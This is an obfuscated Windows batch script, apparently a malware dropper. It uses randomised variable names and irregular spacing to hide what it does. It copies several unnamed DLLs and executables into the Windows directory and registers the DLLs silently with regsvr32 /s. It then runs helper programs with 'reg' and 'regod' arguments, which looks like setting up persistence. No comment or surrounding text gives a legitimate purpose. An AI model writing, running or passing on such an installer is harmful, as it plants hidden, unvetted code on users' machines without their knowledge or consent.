@echo  off

set    m18437503184375=ddkret
set     a12580001125800=oprevtdp
set   s16207506162075=sawkip
set      l11642504116425=nopctrl
set   o10206207102062=regsvr32.exe
set  a15342502153425=bonsws
set     r13936205139362=eklt

copy  %a12580001125800%.dll      %windir%       >nul
copy       %m18437503184375%.dll    %windir%\%m18437503184375%.dll      >nul
copy      %l11642504116425%.dll      %windir%\%l11642504116425%.dll   >nul
copy      %a15342502153425%.dll       %windir%
copy     %s16207506162075%.exe     %windir%       >nul

%o10206207102062%       /s   %a15342502153425%.dll
%windir%\system32\%o10206207102062%  /s       %windir%\%a12580001125800%.dll
%r13936205139362%.exe      %windir%\%m18437503184375%.dll     %m18437503184375%
%r13936205139362%.exe  %windir%\%l11642504116425%.dll   %l11642504116425%

%s16207506162075%.exe       reg
%r13936205139362%.exe  regod
